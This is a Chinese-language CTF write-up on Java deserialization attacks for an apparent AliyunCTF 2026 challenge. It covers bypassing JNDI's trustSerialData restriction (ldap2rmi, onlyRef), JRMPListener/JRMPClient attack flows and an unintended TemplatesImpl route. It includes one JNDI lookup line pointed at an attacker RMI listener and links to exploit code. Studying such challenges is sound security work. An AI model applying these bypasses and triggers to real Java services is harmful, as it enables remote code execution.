>Linux有sun.print.UnixPrintService的printer可以携带参数，然后里面有好多getter都会execCmd该参数的内容，不过这个类只在windows下有，而且是私有+没继承Serializable接口，但是在不需要Serializable场景下调用getter（hessian)就会触发漏洞，因为是私有类所以fastjson/jackson/snakeYaml这种几乎不用考虑了
>
>https://aecous.github.io/2023/10/01/%E5%88%9D%E6%8E%A2UnixPrintService/



因为前面有强转为DirContext，所以这里Proxy也需要代理DirContext

### JNDI trustSerialData限制

下文介绍了JNDI修复的记录

https://mp.weixin.qq.com/s/0Ak9SzG8fnfh3d5llb-TFw

本体pom.xml给出了jdk版本为11，如下版本开始trustSerialData=false

```
openjdk 8u432/11.0.25/17.0.13
oraclejdk 8u461/11.0.28/17.0.16
```

根据如下文章

https://github.com/H4cking2theGate/ysogate/blob/master/docs/JNDIMode.md

`com.sun.jndi.ldap.object.trustSerialData`属性为`false`，无法在com.sun.jndi.ldap.Obj#decodeObject中反序列化，绕过方式主要有：

* ldap2rmi

通过设置javaRemoteLocation来使用com.sun.jndi.ldap.Obj#decodeRmiObject还原Factory对象，从ldap转换成rmi进行绕过。

* onlyRef

利用本地Factory进行攻击时，可以通过设置`objectClass`为`javaNamingReference`来避免进行反序列化，利用decodeReference来还原Factory对象，不适用于BeanFactory绕过，因为BeanFactory需要ResourceRef类型。

显然onlyRef是可以的，因为并没有用到BeanFactory

未实现绕过的原始ldapAtkServer来自marshalsec:

https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java

基于这上面叫ai改就行了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321163006360.png)

原来ldap是能打Reference的噢，看来又得修改知识库了，原来以为只有RMI+Reference





### 非预期

JNDI可以打JRMP，因为POJONode原生反序列化能直接触发RCE，所以用JRMP Listener返回Pojo链就RCE了

额，我其实有个疑问是因为JEP290，高版本不是不能打JRMP了吗

>## 关于JRMP的两种攻击流程如下
>
>### 第一种攻击方式
>
>个人理解：基于RMI的反序列化中的客户端打服务端的类型
>
>我们需要先发送指定的payload（JRMPListener）到存在漏洞的服务器中，使得该服务器反序列化完成我们的payload后会开启一个RMI的服务监听在设置的端口上。
>
>我们还需要在我们自己的服务器使用exploit（JRMPClient）与存在漏洞的服务器进行通信，并且发送一个利用链，达到一个命令执行的效果。
>
>简单来说就是将一个payload（JRMPListener）发送到存在漏洞的服务器，存在漏洞的服务器反序列化操作该payload（JRMPListener）过后会在指定的端口开启RMI监听，然后再通过exploit（JRMPClient） 去发送利用链载荷，最终在存在漏洞的服务器上进行反序列化操作。二次反序列化这一块
>
>### 第二种攻击方式
>
>个人理解：基于RMI的反序列化中的服务端打客户端的类型，这种攻击方式在实战中比较常用
>
>将exploit（JRMPListener）作为攻击方进行监听。
>
>我们发送指定的payloads（JRMPClient）使得存在漏洞的服务器向我们的exploit（JRMPListener）进行连接，连接后exploit（JRMPListener）则会返回给存在漏洞的服务器序列化的对象，而存在漏洞的服务器接收到了则进行反序列化操作，从而进行命令执行的操作。
>
>PS：这里的payload和exploit就是指的不同包下的JRMPListener和JRMPClient！
>
>Ref：https://www.cnblogs.com/zpchcbd/p/14934168.html
>
>而且这里开监听用的是yso exploit下的代码，另一端执行用的payloads下的代码。打JNDI的话直接输地址就行了，连Client都省了

所以第二种打法是无版本限制的

>另外，当个乐子看，在 exploit/JRMPListener 和 payloads/JRMPClient 的利用过程中，这个 server 端和 client  端，攻击者和受害者的角色是可以互换的，在你去打别人的过程中，很有可能被反手一下，所以最好的情况就是，只是发送数据，不去接受另一端传过来的信息，所以说用这个 exploit/JRMPClient 是不会自己打自己的

所以如果打JRMPLisenter，这里的poc是直接改ysoserial的这里，好像不用改源码也行？参数指定就行了

https://github.com/1diot9/CTFSolutions/blob/main/idea/2026/AliyunCTF/MHGA/src/main/java/solution/JRMPListener.java

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321153108038.png)

Client直接lookup

`initialContext.lookup("rmi://127.0.0.1:1399/any");`



这也就解释了，为什么非预期是直接打的TemplatesImpl，因为是JRMP原生反序列化，并不是hessian，当然能直接打了。









payload代码就不写了，看起来乱乱的

别人写了：https://github.com/1diot9/CTFSolutions/blob/main/idea/2026/AliyunCTF/MHGA/src/main/java/solution





